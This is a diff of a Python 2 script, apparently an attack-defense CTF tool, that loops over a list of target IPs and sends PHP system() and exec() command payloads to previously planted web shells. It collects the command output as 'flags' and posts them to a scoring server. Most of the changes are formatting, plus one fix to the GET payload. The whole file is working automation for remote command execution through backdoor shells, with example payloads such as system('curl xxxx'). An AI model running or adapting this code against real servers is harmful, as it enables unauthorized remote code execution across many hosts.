@@ -2,42 +2,43 @@
 
 import requests
 from core.shells import *
+
 flags = []
-cookies=''
-datas=''
-url=''
-command=''
+cookies = ''
+datas = ''
+url = ''
+command = ''
 # Example:POST_data={'x':"system('curl xxxx');"}
-#POST_file = "system('curl xxxx');"
+# POST_file = "system('curl xxxx');"
 
 # Example:GET_data="echo exec('curl xxxx');"
 eval_file = "echo exec('curl xxxx');"
-
 exec_file = "curl xxxx"
 
-#设置获取flag的命令
+
+# 设置获取flag的命令
 def set_command(command):
-    cmd="'"+command+"'"
+    cmd = "'" + command + "'"
     global POST_file,eval_file,exec_file
-    eval_file="system(%s);"%cmd
-    #eval_file="echo exec(%s);"%cmd
-    exec_file=command
+    eval_file = "system(%s);" % cmd
+    # eval_file="echo exec(%s);"%cmd
+    exec_file = command
 
 
-#判断获取flag是否成功
+# 判断获取flag是否成功
 def judege(flag):
     global flags
     check = "<Response [200]>"
-    if str(flag)==check:
+    if str(flag) == check:
         flags.append(flag.text)
         print "got flag!"
     else:
         print "got flag failed!"
 
-#遍历ip列表获取flag
+
+# 遍历ip列表获取flag
 def get_flag(ip_list):
     for i in ip_list:
-        urls = "http://" + i
         for j in POST_eval_shells_path_pwd:
             evel_POST_data = {POST_eval_shells_path_pwd[j]:eval_file}
             url = "http://" + i + j
@@ -51,9 +52,9 @@ def get_flag(ip_list):
             url = "http://" + i + k
             try:
                 if '?' in k:
-                    flag=requests.get(url+'&'+GET_eval_shells_path_pwd[k] + "=" + eval_file)
+                    flag = requests.get(url + '&' + GET_eval_shells_path_pwd[k] + "=" + eval_file)
                 else:
-                    flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
+                    flag = requests.get(url + "?" + GET_eval_shells_path_pwd[k] + "=" + eval_file)
                 judege(flag)
             except:
                 print "error"
@@ -61,7 +62,7 @@ def get_flag(ip_list):
         for m in GET_exec_shells_path_pwd:
             url = "http://" + i + m
             try:
-                flag = requests.get(url + "?"+GET_exec_shells_path_pwd[m] + "=" + exec_file)
+                flag = requests.get(url + "?" + GET_exec_shells_path_pwd[m] + "=" + exec_file)
                 judege(flag)
             except:
                 print "error"
@@ -75,24 +76,25 @@ def get_flag(ip_list):
             except:
                 print "error"
 
+
 def show_flag():
     for i in flags:
         print i
 
 
-#提交flag
-def submit_flag(url=url,cookies=cookies,datas=datas):
+# 提交flag
+def submit_flag(url = url,cookies = cookies,datas = datas):
     global flags
-    cookie=cookies.replace(' ','')
+    cookie = cookies.replace(' ','')
     cookie_dict = dict((line.split('=') for line in cookie.strip().split(";")))
-    data=datas.replace(' ','')
-    data_dict =dict((line.split('=') for line in data.strip().split("&")))
+    data = datas.replace(' ','')
+    data_dict = dict((line.split('=') for line in data.strip().split("&")))
     check = "<Response [200]>"
     for j in data_dict:
         if data_dict[j] == '?':
             p = j
     for i in flags:
-        data_dict[p]=i
+        data_dict[p] = i
         print i
         try:
             a = requests.post(url,data = data_dict,cookies = cookie_dict)
@@ -104,13 +106,14 @@ def submit_flag(url=url,cookies=cookies,datas=datas):
             print "something is wrong ,please check!"
 
     print "ok,do you want to clear flag?"
-    choice=raw_input("y/n")
+    choice = raw_input("y/n")
     while choice not in ['y','n']:
         print "please input 'y/n'"
         choice = raw_input("y/n")
-    if choice =='y':
-        flags=[]
+    if choice == 'y':
+        flags = []
+
 
 def clear_flag():
     global flags
-    flags=[]
+    flags = []
